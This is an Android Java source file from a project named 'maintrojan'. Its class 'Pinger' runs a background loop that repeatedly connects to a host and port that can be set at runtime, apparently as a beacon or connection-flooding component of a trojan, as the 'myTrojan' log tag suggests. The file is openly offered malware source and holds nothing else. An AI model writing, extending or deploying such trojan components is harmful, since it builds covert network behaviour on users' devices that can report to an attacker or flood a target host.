package com.example.maintrojan;

import android.app.Activity;
import android.util.Log;

import java.io.IOException;
import java.net.Socket;

public class Pinger {
    private static final String TAG = "myTrojan";
    private static String host;
    private static int port;
    private static long wait;
    private static Thread thread = null;
    private static boolean stop = true;

    public static void start(){
        if(thread == null){
            thread = new Thread(new Runnable() {
                @Override
                public void run() {
                    while (!stop) {
                        try {
                            Socket socket = new Socket(host, port);
                            Thread.sleep(wait);
                            socket.close();
                        } catch (IOException | InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            });
            stop = false;
            thread.start();
        }
    }
    public static void stop(){
        stop = true;
        thread = null;
    }
    public static void changeVars(String _host, int _port, long _wait){
        host = _host;
        port = _port;
        wait = _wait;
        Log.d(TAG, host+" "+port+" "+wait);
    }
}
